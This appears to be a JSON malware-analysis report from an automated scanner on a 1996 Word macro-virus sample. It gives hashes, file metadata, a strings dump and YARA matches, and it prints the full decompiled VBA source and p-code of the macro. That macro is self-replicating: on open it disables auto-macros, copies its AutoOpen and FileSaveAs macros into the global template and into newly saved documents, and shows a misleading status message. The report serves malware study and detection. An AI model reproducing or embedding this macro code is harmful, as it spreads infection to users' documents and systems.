{
    "docinfo": {
        "attributes": [
            "Attribute VB_Name = \"AutoOpen\""
        ],
        "behavior": {
            "AutoOpen": "Runs when the Word document is opened",
            "Base64 Strings": "Base64-encoded str were detected, may be used to obfuscate str",
            "Call": "May call a DLL using Excel 4 Macros",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code",
            "command": "May run PowerShell commands"
        },
        "macro": "\n\n\nDim formatfile, salah\nDim Filebaru$, Cek$\n\nPublic Sub MAIN()\nAttribute MAIN.VB_Description = \"Saves the active document or template\"\nAttribute MAIN.VB_ProcData.VB_Invoke_Func = \"TemplateProject.AutoOpen.MAIN\"\nDim sqlah\nformatfile = 0\nsalah = 0\nFilebaru$ = \"\"\nCek$ = \"\"\nNoAuto\nOn Error GoTo -1: On Error GoTo finish\nCek$ = WordBasic.[FileNameFromWindow$]()\nIf WordBasic.IsMacro() Then\n    WordBasic.FileSave\n    GoTo finish\nEnd If\nulang:\nSaveTo\nIf sqlah = 1059 Then\n    Cek$ = \"\"\n    GoTo ulang\nEnd If\nfinish:\nIf Err.Number = 509 Then WordBasic.Call \"PrintDisqble\"\nEnd Sub\n\nPrivate Sub NoAuto()\nOn Error GoTo -1: On Error GoTo finish\nWordBasic.DisableInput (1)\nWordBasic.DisableAutoMacros (1)\nfinish:\nEnd Sub\n\nPrivate Sub SaveTo()\nOn Error GoTo -1: On Error GoTo finish\nDim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)\nWordBasic.CurValues.FileSaveAs dlg\nIf Cek$ = \"\" Then WordBasic.Dialog.FileSaveAs dlg\nIf dlg.Format = 0 Then dlg.Format = 1\nformatfile = dlg.Format\nFilebaru$ = WordBasic.[FileName$]()\nIf formatfile = 1 Then CopyToFile\nIf salah = 0 Then\n    If formatfile = 1 Then Aksi\n    WordBasic.FileSaveAs dlg\nEnd If\nfinish:\nsalah = Err.Number\nEnd Sub\n\nPrivate Sub CopyToFile()\nOn Error GoTo -1: On Error GoTo finish\nCekCopyToFile\nIf salah = 0 Then\n    CopyFSAF\nEnd If\nIf salah <> 0 Then\n    CopyFSG\n    CopyFSAG\nEnd If\nfinish:\nEnd Sub\n\nPrivate Sub CekCopyToFile()\nOn Error GoTo -1: On Error GoTo fin\nWordBasic.MacroCopy \"Global:FileSave\", Filebaru$ + \":AutoOpen\", 1\nfin:\nsalah = Err.Number\nEnd Sub\n\nPrivate Sub CopyFSG()\nOn Error GoTo -1: On Error GoTo finish\n    WordBasic.MacroCopy Filebaru$ + \":AutoOpen\", \"Global:FileSave\", 1\nfinish:\nEnd Sub\n\nPrivate Sub CopyFSAG()\nOn Error GoTo -1: On Error GoTo finish\n    WordBasic.MacroCopy Filebaru$ + \":FileSaveAs\", \"Global:FileSaveAs\", 1\nfinish:\nEnd Sub\n\nPrivate Sub CopyFSAF()\nOn Error GoTo -1: On Error GoTo finish\n    WordBasic.MacroCopy \"Global:FileSaveAs\", Filebaru$ + \":FileSaveAs\", 1\nfinish:\nEnd Sub\n\nPrivate Sub Aksi()\nOn Error GoTo -1: On Error GoTo finish\nWordBasic.FileSummaryInfo Comments:=\"DZT\"\nWordBasic.SetDocumentVar \"Dzutaqshiri\", \"(c)Hikmat Sudrajat, Bandung, April 1996\"\nfinish:\nEnd Sub\n\nPrivate Sub PrintDisable()\nOn Error GoTo -1: On Error GoTo finish\nWordBasic.PrintStatusBar \"This command is not available because a document window is not active\"\nfinish:\nEnd Sub\n\n' Processing file: VirusShare_4a67b2ac31f71419c5878982304fe3fc\n' ===============================================================================\n' Module streams:\n' Macros/VBA/ThisDocument - 965 bytes\n' Macros/VBA/AutoOpen - 5523 bytes\n' Line #0:\n' Line #1:\n' \tDim \n' \tVarDefn formatfile\n' \tVarDefn salah\n' Line #2:\n' \tDim \n' \tVarDefn Filebaru\n' \tVarDefn Cek\n' Line #3:\n' Line #4:\n' \tFuncDefn (Public Sub MAIN())\n' Line #5:\n' \tDim \n' \tVarDefn sqlah\n' Line #6:\n' \tLitDI2 0x0000 \n' \tSt formatfile \n' Line #7:\n' \tLitDI2 0x0000 \n' \tSt salah \n' Line #8:\n' \tLitStr 0x0000 \"\"\n' \tSt Filebaru$ \n' Line #9:\n' \tLitStr 0x0000 \"\"\n' \tSt Cek$ \n' Line #10:\n' \tArgsCall NoAuto 0x0000 \n' Line #11:\n' \tOnError <crash> \n' \tBoS 0x0000 \n' \tOnError finish \n' Line #12:\n' \tLd WordBasic \n' \tArgsMemLd [FileNameFromWindow$] 0x0000 \n' \tSt Cek$ \n' Line #13:\n' \tLd WordBasic \n' \tArgsMemLd IsMacro 0x0000 \n' \tIfBlock \n' Line #14:\n' \tLd WordBasic \n' \tArgsMemCall FileSave 0x0000 \n' Line #15:\n' \tGoTo finish \n' Line #16:\n' \tEndIfBlock \n' Line #17:\n' \tLabel ulang \n' Line #18:\n' \tArgsCall SaveTo 0x0000 \n' Line #19:\n' \tLd sqlah \n' \tLitDI2 0x0423 \n' \tEq \n' \tIfBlock \n' Line #20:\n' \tLitStr 0x0000 \"\"\n' \tSt Cek$ \n' Line #21:\n' \tGoTo ulang \n' Line #22:\n' \tEndIfBlock \n' Line #23:\n' \tLabel finish \n' Line #24:\n' \tLd Err \n' \tMemLd Number \n' \tLitDI2 0x01FD \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLitStr 0x000C \"PrintDisqble\"\n' \tLd WordBasic \n' \tArgsMemCall Call 0x0001 \n' \tEndIf \n' Line #25:\n' \tEndSub \n' Line #26:\n' Line #27:\n' \tFuncDefn (Private Sub NoAuto())\n' Line #28:\n' \tOnError <crash> \n' \tBoS 0x0000 \n' \tOnError finish \n' Line #29:\n' \tLitDI2 0x0001 \n' \tParen \n' \tLd WordBasic \n' \tArgsMemCall DisableInput 0x0001 \n' Line #30:\n' \tLitDI2 0x0001 \n' \tParen \n' \tLd WordBasic \n' \tArgsMemCall DisableAutoMacros 0x0001 \n' Line #31:\n' \tLabel finish \n' Line #32:\n' \tEndSub \n' Line #33:\n' Line #34:\n' \tFuncDefn (Private Sub SaveTo())\n' Line #35:\n' \tOnError <crash> \n' \tBoS 0x0000 \n' \tOnError finish \n' Line #36:\n' \tDim \n' \tVarDefn dlg (As Object)\n' \tBoS 0x0000 \n' \tSetStmt \n' \tLitVarSpecial (False)\n' \tLd WordBasic \n' \tMemLd DialogRecord \n' \tArgsMemLd FileSaveAs 0x0001 \n' \tSet dlg \n' Line #37:\n' \tLd dlg \n' \tLd WordBasic \n' \tMemLd CurValues \n' \tArgsMemCall FileSaveAs 0x0001 \n' Line #38:\n' \tLd Cek$ \n' \tLitStr 0x0000 \"\"\n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLd dlg \n' \tLd WordBasic \n' \tMemLd Dialog \n' \tArgsMemCall FileSaveAs 0x0001 \n' \tEndIf \n' Line #39:\n' \tLd dlg \n' \tMemLd Format$ \n' \tLitDI2 0x0000 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLitDI2 0x0001 \n' \tLd dlg \n' \tMemSt Format$ \n' \tEndIf \n' Line #40:\n' \tLd dlg \n' \tMemLd Format$ \n' \tSt formatfile \n' Line #41:\n' \tLd WordBasic \n' \tArgsMemLd [FileName$] 0x0000 \n' \tSt Filebaru$ \n' Line #42:\n' \tLd formatfile \n' \tLitDI2 0x0001 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tArgsCall CopyToFile 0x0000 \n' \tEndIf \n' Line #43:\n' \tLd salah \n' \tLitDI2 0x0000 \n' \tEq \n' \tIfBlock \n' Line #44:\n' \tLd formatfile \n' \tLitDI2 0x0001 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tArgsCall Aksi 0x0000 \n' \tEndIf \n' Line #45:\n' \tLd dlg \n' \tLd WordBasic \n' \tArgsMemCall FileSaveAs 0x0001 \n' Line #46:\n' \tEndIfBlock \n' Line #47:\n' \tLabel finish \n' Line #48:\n' \tLd Err \n' \tMemLd Number \n' \tSt salah \n' Line #49:\n' \tEndSub \n' Line #50:\n' Line #51:\n' \tFuncDefn (Private Sub CopyToFile())\n' Line #52:\n' \tOnError <crash> \n' \tBoS 0x0000 \n' \tOnError finish \n' Line #53:\n' \tArgsCall CekCopyToFile 0x0000 \n' Line #54:\n' \tLd salah \n' \tLitDI2 0x0000 \n' \tEq \n' \tIfBlock \n' Line #55:\n' \tArgsCall CopyFSAF 0x0000 \n' Line #56:\n' \tEndIfBlock \n' Line #57:\n' \tLd salah \n' \tLitDI2 0x0000 \n' \tNe \n' \tIfBlock \n' Line #58:\n' \tArgsCall CopyFSG 0x0000 \n' Line #59:\n' \tArgsCall CopyFSAG 0x0000 \n' Line #60:\n' \tEndIfBlock \n' Line #61:\n' \tLabel finish \n' Line #62:\n' \tEndSub \n' Line #63:\n' Line #64:\n' \tFuncDefn (Private Sub CekCopyToFile())\n' Line #65:\n' \tOnError <crash> \n' \tBoS 0x0000 \n' \tOnError fin \n' Line #66:\n' \tLitStr 0x000F \"Global:FileSave\"\n' \tLd Filebaru$ \n' \tLitStr 0x0009 \":AutoOpen\"\n' \tAdd \n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0003 \n' Line #67:\n' \tLabel fin \n' Line #68:\n' \tLd Err \n' \tMemLd Number \n' \tSt salah \n' Line #69:\n' \tEndSub \n' Line #70:\n' Line #71:\n' \tFuncDefn (Private Sub CopyFSG())\n' Line #72:\n' \tOnError <crash> \n' \tBoS 0x0000 \n' \tOnError finish \n' Line #73:\n' \tLd Filebaru$ \n' \tLitStr 0x0009 \":AutoOpen\"\n' \tAdd \n' \tLitStr 0x000F \"Global:FileSave\"\n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0003 \n' Line #74:\n' \tLabel finish \n' Line #75:\n' \tEndSub \n' Line #76:\n' Line #77:\n' \tFuncDefn (Private Sub CopyFSAG())\n' Line #78:\n' \tOnError <crash> \n' \tBoS 0x0000 \n' \tOnError finish \n' Line #79:\n' \tLd Filebaru$ \n' \tLitStr 0x000B \":FileSaveAs\"\n' \tAdd \n' \tLitStr 0x0011 \"Global:FileSaveAs\"\n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0003 \n' Line #80:\n' \tLabel finish \n' Line #81:\n' \tEndSub \n' Line #82:\n' Line #83:\n' \tFuncDefn (Private Sub CopyFSAF())\n' Line #84:\n' \tOnError <crash> \n' \tBoS 0x0000 \n' \tOnError finish \n' Line #85:\n' \tLitStr 0x0011 \"Global:FileSaveAs\"\n' \tLd Filebaru$ \n' \tLitStr 0x000B \":FileSaveAs\"\n' \tAdd \n' \tLitDI2 0x0001 \n' \tLd WordBasic \n' \tArgsMemCall MacroCopy 0x0003 \n' Line #86:\n' \tLabel finish \n' Line #87:\n' \tEndSub \n' Line #88:\n' Line #89:\n' \tFuncDefn (Private Sub Aksi())\n' Line #90:\n' \tOnError <crash> \n' \tBoS 0x0000 \n' \tOnError finish \n' Line #91:\n' \tLitStr 0x0003 \"DZT\"\n' \tParamNamed Comments \n' \tLd WordBasic \n' \tArgsMemCall FileSummaryInfo 0x0001 \n' Line #92:\n' \tLitStr 0x000B \"Dzutaqshiri\"\n' \tLitStr 0x0027 \"(c)Hikmat Sudrajat, Bandung, April 1996\"\n' \tLd WordBasic \n' \tArgsMemCall SetDocumentVar 0x0002 \n' Line #93:\n' \tLabel finish \n' Line #94:\n' \tEndSub \n' Line #95:\n' Line #96:\n' \tFuncDefn (Private Sub PrintDisable())\n' Line #97:\n' \tOnError <crash> \n' \tBoS 0x0000 \n' \tOnError finish \n' Line #98:\n' \tLitStr 0x0045 \"This command is not available because a document window is not active\"\n' \tLd WordBasic \n' \tArgsMemCall PrintStatusBar 0x0001 \n' Line #99:\n' \tLabel finish \n' Line #100:\n' \tEndSub \n"
    },
    "filename": "VirusShare_4a67b2ac31f71419c5878982304fe3fc",
    "filesize": 34304,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.0, Code page: 1252, Author: l, Template: Dzt.J.doc, Last Saved By: ULTRAS, Revision Number: 2, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Sun Aug  4 05:25:00 1996, Last Saved Time/Date: Sun Aug  4 05:25:00 1996, Number of Pages: 1, Number of Words: 0, Number of Characters: 1, Security: 0",
    "hashes": {
        "md5": "4a67b2ac31f71419c5878982304fe3fc",
        "sha1": "0b3d956ad024ff500a19f07803817f1259cc8e71",
        "sha256": "784ddfdac19d9ce0dc57148a079431b4ca0d10e5bfa7978316d4d84c47e59c44"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbjBB",
            "/ =!",
            "Dzt.J.doc",
            "ULTRAS",
            "Microsoft Word 8.0",
            "Title",
            "_PID_GUID",
            "Attribut",
            "e VB_Nam",
            "e = \"Thi",
            "sDocumen",
            "0{00020P906-",
            "$0046}",
            "|Creatabl",
            "False",
            "Predecla",
            "\"@Expose",
            "emplateD0eriv",
            "eCustomiz",
            "he activ",
            "e docume",
            "nt or template",
            "ProcData",
            "TInvoke_Func",
            "\"ject.",
            "O n ErrTGoTo -1: ",
            "`finis",
            "ordBasic",
            "From",
            "Window$]",
            "acro() Then",
            "@7End",
            "ula ng:",
            "c105>9",
            "@=.Number",
            "H.Call \"P",
            "rintDisq<blp",
            "Input (1@",
            "AjQs",
            "1#J#dlg@ As Ob",
            ": Set ",
            "DialogRe",
            "oAs(F",
            "alseJ.CurValues\t",
            "pFjBo",
            "@\".F",
            "CopyTo!",
            "Aksi",
            "?=o cF",
            "FSAF'",
            "<> /c",
            "!Sw]U",
            " \"Globalb:E,\", A",
            ">+ \":h, Ein-f|",
            "\tb[a:",
            "ummaryInfo",
            "s:=\"DZ.Tv",
            "TDTVa",
            "r \"Dzuta@qshiri",
            "(`c)Hik0dd",
            "rajat, B",
            "andung, ",
            "April 1996 ",
            "0jV*?j!e_",
            "St atusB",
            "This co`",
            "not avai",
            " becausWw ",
            "Saves the active document or template",
            "TemplateProject.AutoOpen.MAIN",
            "PrintDisqble ",
            "Global:FileSave",
            ":AutoOpen",
            ":AutoOpen",
            "Global:FileSave",
            ":FileSaveAs",
            "Global:FileSaveAs",
            "Global:FileSaveAs",
            ":FileSaveAs",
            "Dzutaqshiri",
            "(c)Hikmat Sudrajat, Bandung, April 1996",
            "This command is not available because a document window is not active",
            "Attribut",
            "e VB_Nam",
            "e = \"Aut",
            "oOpen\"",
            "Dim fo",
            "rmatfile, salah",
            "@baru$,  Cek$",
            "blic Sub",
            " MAIN()",
            "cription",
            "Saves t#",
            "23204261b",
            "43204261d",
            "DEST",
            "DEST",
            "FALSE",
            "Wordk",
            "Win16~",
            "Win32",
            "Dzt.J|",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Office",
            "TemplateProjectE",
            "Module1b",
            "AutoOpen*",
            "formatfilea",
            "salahZ",
            "Filebaru",
            "Cek}",
            "MAIN,",
            "sqlah6",
            "NoAuto",
            "finishX",
            "WordBasic",
            "FileNameFromWindow$",
            "IsMacro|",
            "FileSave",
            "ulang",
            "SaveTo!>",
            "Erro",
            "Number-",
            "DisableInputS",
            "DisableAutoMacros",
            "dlg-",
            "DialogRecord",
            "FileSaveAs",
            "CurValues\u0224",
            "Dialogf",
            "FileName$m",
            "CopyToFile",
            "AksiJ",
            "CekCopyToFile",
            "CopyFSAF",
            "CopyFSGd\\",
            "CopyFSAG",
            "finw",
            "MacroCopyE",
            "FileSummaryInfoY",
            "Comments)",
            "SetDocumentVar",
            "PrintDisable",
            "PrintStatusBar=",
            "Documentj",
            "Template",
            "Project",
            "9std",
            "ole>",
            "\\G{00020430-",
            "0046}#",
            "2.0#0#C:",
            "\\WINDOWS",
            "\\SYSTEM\\",
            "STDOLE2.",
            "TLB#",
            "tomation#",
            "Forms>",
            "FC2E84",
            "562-635F",
            "-11D1-8B",
            "D2-444558354",
            "WD#Microsoft ",
            " Libprary",
            "P3$P",
            "TMP\\VBE\\\tE&EXg&.E",
            "vOf(fic",
            "vR2DF",
            "8D04C-5B",
            "FA-101B-BDE5",
            "2RH:\\OFF97PRO",
            "IC,O97.D",
            " 8.0ER",
            "ThisD",
            "ocument",
            "uQ@e",
            "Open",
            "p@Mn",
            "DEST",
            "Dzt.J",
            "ThisDocument",
            "TemplateProject",
            "Module1",
            "AutoOpen",
            "C:\\PROGRAM FILES\\COMMON FILES\\MICROSOFT SHARED\\VBA\\VBA332.DLL",
            "D:\\OFFICE97\\OFFICE\\MSWORD8.OLB",
            "Word",
            "C:\\WINDOWS\\SYSTEM\\STDOLE2.TLB",
            "stdole",
            "PrintDisable",
            "bE_c",
            "DEST",
            "C:\\WINDOWS\\SYSTEM\\MSForms.TWD",
            "MSForms",
            "cE_c",
            "DEST",
            "C:\\TMP\\VBE\\MSForms.EXD",
            "H:\\OFF97PRO\\OFFICE\\MSO97.DLL",
            "Office",
            "MAIN",
            "NoAuto",
            "SaveTo",
            "CopyToFile",
            "CekCopyToFile",
            "CopyFSG",
            "CopyFSAG",
            "CopyFSAF",
            "Aksi",
            "Saves the active document or template",
            "TemplateProject.AutoOpen.MAIN`",
            "ThisDocument",
            "AutoOpen",
            "ID=\"{3B741E67-ED86-11CF-8BEF-444553540000}\"",
            "Document=ThisDocument/&H00000000",
            "Module=AutoOpen",
            "Name=\"TemplateProject\"",
            "HelpContP",
            "extID=\"0\"",
            "CMG=\"D7D56F5A91E66CEA6CEA6CEA6CEA\"",
            "DPB=\"AEAC16B33A5D105E105E10\"",
            "GC=\"85873DE8C3BEC4BEC441\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8"
        ],
        "file": {
            "C:\\PROGRAM FILES\\COMMON FILES\\MICROSOFT SHARED\\VBA\\VBA332.DLL": "Library",
            "D:\\OFFICE97\\OFFICE\\MSWORD8.OLB": "Autogen",
            "Dzt.J.doc": "Word",
            "H:\\OFF97PRO\\OFFICE\\MSO97.DLL": "Library"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.328271",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "maldoc_somerules.yar": "Office_AutoOpen_Macro"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
